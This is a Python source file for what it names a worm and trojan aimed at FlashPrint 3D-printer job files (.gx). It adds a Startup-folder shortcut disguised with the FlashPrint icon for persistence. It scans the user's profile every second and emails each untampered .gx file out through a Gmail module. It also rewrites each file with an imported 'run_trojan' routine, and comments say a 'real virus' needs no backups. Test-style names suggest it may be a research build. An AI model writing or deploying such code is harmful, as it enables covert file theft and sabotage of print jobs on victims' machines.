import run_me_jonah_trojans as jt
import gmailApi as gm
#import appOpener as app
import sys, os


target_directory = "%UserProfile%" 
#Not used in real directory so it is not local
backup_directory = "C:\\Users\\jonah\\OneDrive\\Desktop\\Backup_files"
startup = "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
desktop = "%UserProfile%\OneDrive\\Desktop"

#Finds current file in .py format, doesn't work in exe
if getattr(sys, 'frozen', False):
    # If the application is run as a bundle, the PyInstaller bootloader
    # extends the sys module by a flag frozen=True and sets the app 
    # path into variable _MEIPASS'.
    thisFilepy = sys._MEIPASS

else:
    thisFilepy = __file__

#For exe format just use this
thisFileexe = os.getcwd() + "\\FlashPrintTrojanTest.exe"
#monitor the directory for changes, and any time a new file ending in ".gx" is added, run the trojan on it
import os
import time
import shutil
import winshell, win32com.client, pythoncom

def get_all_gx_files(directory):
    print(thisFileexe)
    file_paths = []
    for root, directories, files in os.walk(directory):
        print (directories)
        for filename in files:
            print ("Scanning file name" + filename)
            if filename.endswith(".gx") and "backup" not in filename:
                #open the file and check if it has already been trojaned 
                # by looking for the string ";ALREADY_TROJANED" in the first 10 lines\
                global emailSubject
                emailSubject = filename
                trojaned = False
                fi = open(directory + "\\" + filename, "rb")
                count = 0
                for line in fi:
                    if line.startswith(b';ALREADY_TROJANED'):
                        trojaned = True
                        break
                    count += 1
                    if count > 10:
                        break
                fi.close()
                
                if trojaned:
                    continue

                #this is a gx file that hasn't been trojaned              
                filepath = os.path.join(root, filename)
                file_paths.append(filename)
    return file_paths
def make_Trojan_Startup():
    file_paths = []
    for root, directories, files in os.walk(startup):
        for filename in files:
            if "Trojan" not in filename:
                path = os.path.join(startup, 'FlashPrintTrojan.lnk')
                target = (thisFileexe)
                icon = (thisFileexe + "FlashPrint.exe")
                shell = win32com.client.Dispatch("WScript.Shell")
                shortcut = shell.CreateShortCut(path)
                shortcut.Targetpath = target
                shortcut.IconLocation = icon
                shortcut.save()
                break
    return
def make_Trojan_Desktop():
    file_paths = []
    for root, directories, files in os.walk(desktop):
        for filename in files:
            if "Trojan" not in filename:
                path = os.path.join(desktop, 'FlashPrintTrojan.lnk')
                target = (thisFileexe)
                icon = (thisFileexe + "FlashPrint.exe")
                shell = win32com.client.Dispatch("WScript.Shell")
                shortcut = shell.CreateShortCut(path)
                shortcut.Targetpath = target
                shortcut.IconLocation = icon
                shortcut.save()
                break
    return
def worm_loop():
    target_files = get_all_gx_files(target_directory)  
    if len(target_files) > 0:
        #for each target file, run the trojan on it
        for target_file in target_files:
            #send file to your email
            gm.send_message(gm.gmail_authenticate() , emailSubject , "Here is your file, have fun printing", [ target_directory + "\\" + target_file])
            #make a backup of the file, disabled becuase for real virus we don't need to make backups
            shutil.copyfile(target_directory + "\\" + target_file, backup_directory + "\\" + target_file)
            #run the trojan on the file
            jt.run_trojan(target_directory + "\\" + target_file, target_directory + "\\" + target_file)

def main():
    make_Trojan_Startup()
    make_Trojan_Desktop()
    #app.openApp()
    print("WORM STARTED")
    while True: #every 1 second, check for new files
        worm_loop()
        time.sleep(1)

if __name__ == "__main__":
    main()
